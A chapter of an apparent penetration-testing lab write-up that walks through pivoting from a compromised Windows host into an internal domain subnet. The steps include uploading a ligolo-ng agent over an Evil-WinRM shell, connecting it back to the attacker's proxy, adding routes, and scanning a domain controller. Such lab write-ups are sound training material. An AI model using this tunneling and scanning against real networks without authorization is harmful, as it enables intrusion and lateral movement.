# 04 — Pivot into `172.16.97.0/24`

`172.16.97.200` and `172.16.97.202` do not answer from the exam network. `WS26` sits on both sides:
one interface faces the attacker, the other faces the domain. Local Administrator on `WS26` is
therefore not a trophy, it is a network position.

## 4.1 What the pivot has to solve

```bash
nmap -Pn -p88,389,445 172.16.97.200 172.16.97.202
```

```text
Nmap scan report for 172.16.97.200
Host is up.
All 3 scanned ports on 172.16.97.200 are in ignored states.
Not shown: 3 filtered tcp ports (no-response)

Nmap scan report for 172.16.97.202
Host is up.
All 3 scanned ports on 172.16.97.202 are in ignored states.
Not shown: 3 filtered tcp ports (no-response)
```

The hosts are alive and every port is filtered — a firewall that permits the member server and nothing
else. Traffic has to leave from `WS26`.

## 4.2 The tunnel

On Kali, create the tun device and start the proxy:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

```text
INFO[0000] Ligolo-ng proxy v0.6.2
INFO[0000] Starting ligolo-ng proxy
WARN[0000] TLS Certificate is self-signed, use -selfcert
INFO[0000] Listening on 0.0.0.0:11601
```

On `WS26`, from the Administrator shell, drop the agent and point it back at Kali:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /opt/tools/agent.exe .
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\agent.exe -connect 192.168.49.97:11601 -ignore-cert
```

```text
INFO[0000] Connecting (TLS) to 192.168.49.97:11601...
INFO[0000] Connection established
INFO[0000] Agent is ready
```

Back on the proxy, the agent registers and its interfaces are visible:

```text
ligolo-ng » session
? Specify a session : 1 - WS26\Administrator@WS26 - 192.168.49.97:11601

[Agent : WS26\Administrator@WS26] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├───────────────────────────────────────────────┤
│ Name          : Ethernet                      │
│ Hardware MAC  : [redacted]                    │
│ MTU           : 1500                          │
│ Flags         : UP|BROADCAST|RUNNING          │
│ IPv4 Address  : 172.16.97.206/24              │
└───────────────────────────────────────────────┘
```

Start the tunnel and route the domain network through it:

```text
[Agent : WS26\Administrator@WS26] » start
INFO[0001] Starting tunnel to WS26\Administrator@WS26
```

```bash
sudo ip route add 172.16.97.0/24 dev ligolo
ip route | grep ligolo
```

```text
172.16.97.0/24 dev ligolo scope link
```

## 4.3 Verify before scanning

```bash
nxc smb 172.16.97.200
```

```text
SMB         172.16.97.200   445    SRV22    [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:oscp.exam) (signing:True) (SMBv1:None)
```

```bash
nxc smb 172.16.97.202
```

```text
SMB         172.16.97.202   445    [redacted]    [*] Windows Server 2019 Build 17763 x64 (name:[redacted]) (domain:oscp.exam) (signing:False) (SMBv1:None)
```

The tunnel works when the DC answers LDAP and Kerberos, not just SMB — a route that only forwards
`445` is a route that will fail the next step.

## 4.4 The domain controller, now reachable

```bash
sudo nmap -sV -p- -Pn -T4 172.16.97.200 -oN nmap/SRV22.txt
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

`SRV22` is a Server 2022 domain controller with WinRM exposed. That last detail is tempting and
useless with the accounts in hand: `p.andrew` is not a `Remote Management Users` member there, and the
local Administrator hash from `WS26` is local to `WS26`.

## 4.5 The second server

`172.16.97.202` answers the same member-server surface as `WS26` minus the web application:

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

No HTTP, no WinRM, no obvious service to attack, and nothing that accepts `p.andrew`. This is the host
that holds the missing credential — see [`06-bloodhound-and-the-wall.md`](06-bloodhound-and-the-wall.md)
— and it stays out of reach for the rest of this lab.

## 4.6 What the pivot changes

| Before the tunnel | After the tunnel |
|---|---|
| one host, `WS26` | three hosts in `172.16.97.0/24` |
| SMB/WinRM only | LDAP, Kerberos, DNS against `SRV22` |
| no domain enumeration | BloodHound collection possible |
| no path to `proof.txt` | a domain administrator account to find |

The tunnel is also what makes the dead ends in the next chapter possible: with LDAP and Kerberos in
reach, every obvious domain attack becomes available, and every one of them fails.

---

**Next:** [`05-dead-ends.md`](05-dead-ends.md)
